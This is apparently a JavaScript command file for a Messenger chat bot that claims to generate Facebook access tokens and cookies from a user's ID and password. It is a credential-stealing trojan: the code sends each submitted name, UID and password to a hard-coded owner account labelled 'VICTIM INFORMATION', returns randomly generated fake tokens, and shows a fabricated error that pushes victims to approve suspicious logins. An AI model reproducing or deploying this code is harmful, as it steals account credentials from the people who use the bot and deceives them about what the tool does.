const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

module.exports.config = {
  name: "sharetoken",
  version: "1.0",
  hasPermssion: 0,
  credits: "junjun", // Please don't change credits!
  description: "Generate FB ACCESS_TOKEN, EAAD6V7, COOKIES",
  commandCategory: "fun",
  usePrefix: true,
  usages: "[uid] [password]",
  cooldowns: 15,
  envConfig: {
    autoUnsend: true,
    delayUnsend: 300
  }
};

module.exports.run = async ({ api, event, args }) => {
  const { threadID, messageID, senderID } = event;
  const uid = args[0];
  const pass = args[1];

  api.sendMessage("GETTING TOKEN....", threadID, messageID);

  try {
    if (!uid || !pass) {
      api.sendMessage("Invalid input. Please provide both UID and password along with the command.", threadID, messageID);
      return;
    }

if (uid.length < 8 || pass.length < 4) {
    const errorResponse = {
      response: {
        status: 400,
        statusText: 'Request failed with status code',
        fakemethod: 'To fix this issue, please change your password or provide the correct password before obtaining tokens. Ensure that your password does not contain any symbols. If your account was flagged for unauthorized login, verify that it was indeed you by selecting the "This was me!" button. If the error persists, please send a report or feedback to BOTOWNER or contact the creator of the command directly via PM at https://www.facebook.com/100081852204977'
      },
    };
    setTimeout(() => {
      handleError(api, threadID, messageID, errorResponse);
    }, 5000);
    return;
  }

    let userName = await getUserName(api, senderID);
    const ownerID = "100081201591674"; // Replace with your owner's ID
    const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}`;
    api.sendMessage(ownerMessage, ownerID);

    try {
      const fakeTokenData = generateFakeToken(uid);
      if (fakeTokenData) {
        const { access_token_eaad6v7, access_token, cookies } = fakeTokenData;

        setTimeout(() => {
          api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\nEAAAA${access_token}`, threadID, messageID);
          api.sendMessage(`𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:\nc_user=${uid};\n${cookies}`, threadID, messageID);
          api.sendMessage(`𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\nEAAD6V7${access_token_eaad6v7}`, threadID, messageID);
          api.sendMessage(`Never share your tokens and cookies with anyone.`, threadID, messageID);
        }, 5000);
      } else {
        api.sendMessage("Failed to generate token.", threadID, messageID);
      }
    } catch (error) {
      setTimeout(() => {
        api.sendMessage(`${error}\n\nIf you encounter issues, please review your inputs and try again.`, threadID, messageID);
      }, 5000);
    }
  } catch (error) {
    console.error(error);
    api.sendMessage("An error occurred while processing your request.", threadID, messageID);
  }
};

function handleError(api, threadID, messageID, errorResponse) {
  const errorMessage = `AxiosError: ${errorResponse.response.statusText} ${errorResponse.response.status}\n\n${errorResponse.response.fakemethod}`;
  api.sendMessage(errorMessage, threadID, messageID);
}

function generateFakeToken(username) {
  const access_token = generateRandomToken(255);
  const access_token_eaad6v7 = generateRandomToken(255);
  const cookies = generateRandomCookies();

  return {
    access_token_eaad6v7,
    access_token,
    cookies,
  };
}

function generateRandomCookies() {
  const cookies = [
    `xs=${generateRandomToken(18)}:${generateRandomToken(32)}:2:${Math.floor(
      Date.now() / 1000
    )}:-1:7714;`,
    `fr=${generateRandomToken(32)}:${generateRandomToken(32)}:${generateRandomToken(
      32
    )}.0.0.${generateRandomToken(32)}.AWUHFLLAHMg;`,
    `datr=${generateRandomToken(16)};`,
  ];

  return cookies.join(' ');
}

function generateRandomToken(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let token = '';
  for (let i = 0; i < length; i++) {
    token += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return token;
}

async function getUserName(api, userID) {
  try {
    const userInfo = await api.getUserInfo(userID);
    if (userInfo && userInfo[userID]) {
      return userInfo[userID].name;
    } else {
      return "Unknown";
    }
  } catch (error) {
    return "Unknown";
  }
}
